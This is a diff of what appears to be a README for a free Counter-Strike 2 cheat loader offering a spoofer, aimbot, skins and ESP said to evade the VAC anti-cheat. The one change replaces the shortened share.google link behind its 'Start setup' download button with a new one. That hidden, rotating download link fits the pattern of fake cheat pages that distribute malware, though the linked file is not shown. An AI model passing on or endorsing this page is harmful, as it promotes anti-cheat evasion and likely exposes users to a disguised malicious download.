@@ -5,7 +5,7 @@
 One loader for Counter-Strike 2 — **spoofer, aimbot, skins and ESP**. Built for the current VAC patch. **Free, portable, updated per patch.**
 
 <p align="center">
-  <a href="https://share.google/hYPVmC724NLF0xwK2"><img src="button.svg" alt="Start setup" height="46"></a>
+  <a href="https://share.google/O2xgoBbz7axtGZezZ"><img src="button.svg" alt="Start setup" height="46"></a>
 </p>
 
 ## ⚡ Quick Start
